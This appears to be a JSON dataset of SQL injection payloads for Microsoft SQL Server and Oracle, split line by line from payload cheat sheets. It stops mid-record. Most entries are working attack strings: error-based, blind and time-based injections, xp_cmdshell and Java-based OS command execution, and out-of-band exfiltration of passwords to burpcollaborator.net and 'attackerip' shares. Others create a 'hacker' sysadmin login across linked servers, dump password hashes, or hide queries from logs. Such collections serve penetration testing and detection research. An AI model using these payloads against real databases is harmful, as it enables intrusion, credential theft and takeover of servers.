  {
    "payload": "| User            | `SELECT system_user;`                     |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| User            | `SELECT user;`                            |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT name FROM master..sysdatabases;",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT name FROM master.sys.databases;",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT DB_NAME(N);",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": " Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT STRING_AGG(name, ', ') FROM master..sysdatabases;",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": " use xtype = 'V' for views",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT name FROM master..sysobjects WHERE xtype = 'U';",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": " Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| CONVERT      | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| IN           | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -` |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| EQUAL        | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -` |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "| CAST         | `CAST((SELECT @@version) AS INT)` |",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "' + convert(int,@@version) + '",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "' + cast((SELECT @@version) as int) + '",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- ",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT message FROM data WHERE row = 1 and message like 't%'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "ProductID=1;waitfor delay '0:0:10'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "ProductID=1);waitfor delay '0:0:10'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "ProductID=1';waitfor delay '0:0:10'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "ProductID=1');waitfor delay '0:0:10'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "ProductID=1));waitfor delay '0:0:10'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT 'A'SELECT 'B'SELECT 'C'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": " you won't have the output of the query, redirect it to a file",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "* Use a semi-colon \"`;`\" to add another query",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "ProductID=1; DROP members",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "OPENROWSET(BULK 'C:\\path\\to\\file', SINGLE_CLOB)",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "execute spWriteStringToFile 'contents', 'C:\\path\\to\\', 'file'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXEC xp_cmdshell \"net user\";",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXEC sp_configure 'show advanced options',1;",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "RECONFIGURE;",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXEC sp_configure 'xp_cmdshell',1;",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "> Executed by a different user than the one using `xp_cmdshell` to execute commands",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"getpass\").getuser())'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"os\").system(\"whoami\"))'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open(\"C:\\\\inetpub\\\\wwwroot\\\\web.config\", \"r\").read())'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "1 and exists(select * from fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.xem',null,null))",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "1 (select 1 where exists(select * from fn_get_audit_file('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\',default,default)))",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "1 and exists(select * from fn_trace_gettable('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.trc',default))",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "1'; use master; exec xp_dirtree '\\\\10.10.15.XX\\SHARE';",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "xp_dirtree '\\\\attackerip\\file'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "xp_fileexist '\\\\attackerip\\file'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "BACKUP LOG [TESTING] TO DISK = '\\\\attackerip\\file'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "BACKUP DATABASE [TESTING] TO DISK = '\\\\attackeri\\file'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "RESTORE LOG [TESTING] FROM DISK = '\\\\attackerip\\file'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "RESTORE DATABASE [TESTING] FROM DISK = '\\\\attackerip\\file'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "RESTORE HEADERONLY FROM DISK = '\\\\attackerip\\file'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "RESTORE FILELISTONLY FROM DISK = '\\\\attackerip\\file'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "RESTORE LABELONLY FROM DISK = '\\\\attackerip\\file'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "RESTORE REWINDONLY FROM DISK = '\\\\attackerip\\file'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "RESTORE VERIFYONLY FROM DISK = '\\\\attackerip\\file'",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "> The links between databases work even across forest trusts.",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "msf> use exploit/windows/mssql/mssql_linkcrawler",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "[msf> set DEPLOY true] # Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "select * from openquery(\"dcorp-sql1\", 'select * from master..sysservers')",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "select version from openquery(\"linkedserver\", 'select @@version as version');",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "select version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")')",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "select 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"')",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT * FROM fn_my_permissions(NULL, 'SERVER');",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT * FROM fn_my_permissions (NULL, 'DATABASE');",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name;",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT is_srvrolemember('sysadmin');",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "Use `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_password",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": " 'sp_password' was found in the text of this event.",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "* [Error based SQL Injection in \"Order By\" clause - Manish Kishan Tanwar - March 26, 2018](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20\u201cOrder%20By\u201d%20clause%20(MSSQL).pdf)",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "* [Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - January 28, 2009](https://www.exploit-db.com/papers/12975)",
    "category": "sql injection",
    "source_file": "MSSQL Injection.md"
  },
  {
    "payload": "SELECT DISTINCT owner FROM all_tables;\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT table_name FROM all_tables;\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT owner, table_name FROM all_tables;\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='<DBNAME>'\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) \n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "    exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "        SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\\\windows\\\\system32\\\\cmd.exe','/c', 'dir >c:\\test.txt') FROM DUAL\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "        SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "        SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "    EXECUTE IMMEDIATE 'create or replace and compile java source named \"PwnUtil\" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "    END;\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "    EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "    SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "    EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "    SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT os_command.exec_clob('<COMMAND>') cmd from dual\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)\n",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "> Oracle SQL Injection  is a type of security vulnerability that arises when attackers can insert or \"inject\" malicious SQL code into SQL queries executed by Oracle Database. This can occur when user inputs are not properly sanitized or parameterized, allowing attackers to manipulate the query logic. This can lead to unauthorized access, data manipulation, and other severe security implications.",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Name               | Description               |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "|--------------------|---------------------------|",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| SYSTEM             | Available in all versions |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| SYSAUX             | Available in all versions |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Description   | SQL Query |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| ------------- | ------------------------------------------------------------ |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| DBMS version  | `SELECT user FROM dual UNION SELECT * FROM v$version`        |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| DBMS version  | `SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';`  |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| DBMS version  | `SELECT banner FROM v$version WHERE banner LIKE 'TNS%';`     |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| DBMS version  | `SELECT BANNER FROM gv$version WHERE ROWNUM = 1;`            |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| DBMS version  | `SELECT version FROM v$instance;`                            |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Hostname      | `SELECT UTL_INADDR.get_host_name FROM dual;`                 |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Hostname      | `SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;`     |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Hostname      | `SELECT UTL_INADDR.get_host_address FROM dual;`              |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Hostname      | `SELECT host_name FROM v$instance;`                          |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Database name | `SELECT global_name FROM global_name;`                       |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Database name | `SELECT name FROM V$DATABASE;`                               |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Database name | `SELECT instance_name FROM V$INSTANCE;`                      |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Database name | `SELECT SYS.DATABASE_NAME FROM DUAL;`                        |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Database name | `SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;` |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Query                                   | Description               |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "|-----------------------------------------|---------------------------|",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| `SELECT username FROM all_users;`       | Available on all versions |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| `SELECT name, password from sys.user$;` | Privileged, <= 10g        |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| `SELECT name, spare4 from sys.user$;`   | Privileged, <= 11g        |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT DISTINCT owner FROM all_tables;",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT table_name FROM all_tables;",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT owner, table_name FROM all_tables;",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='<DBNAME>'",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Description           | Query          |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| :-------------------- | :------------- |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Invalid HTTP Request  | `SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual` |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| CTXSYS.DRITHSX.SN     | `SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual` |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Invalid XPath         | `SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual` |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Invalid XML           | `SELECT to_char(dbms_xmlgen.getxml('select \"'&#124;&#124;(select user from sys.dual)&#124;&#124;'\" FROM sys.dual')) FROM dual` |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Invalid XML           | `SELECT rtrim(extract(xmlagg(xmlelement(\"s\", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users` |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| SQL Error             | `SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))` |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| XDBURITYPE getblob    | `XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()` |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| XDBURITYPE getclob    | `XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()` |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| XMLType               | `AND 1337=(SELECT UPPER(XMLType(CHR(60)\\|\\|CHR(58)\\|\\|'~'\\|\\|(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))\\|\\|'~'\\|\\|CHR(62))) FROM DUAL) -- -` |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| DBMS_UTILITY          | `AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'\\|\\|(SELECT banner FROM v$version)\\|\\|'~') -- -` |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "When the injection point is inside a string use : `'||PAYLOAD",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Description              | Query          |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| :----------------------- | :------------- |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Version is 12.2        | `SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';` |",
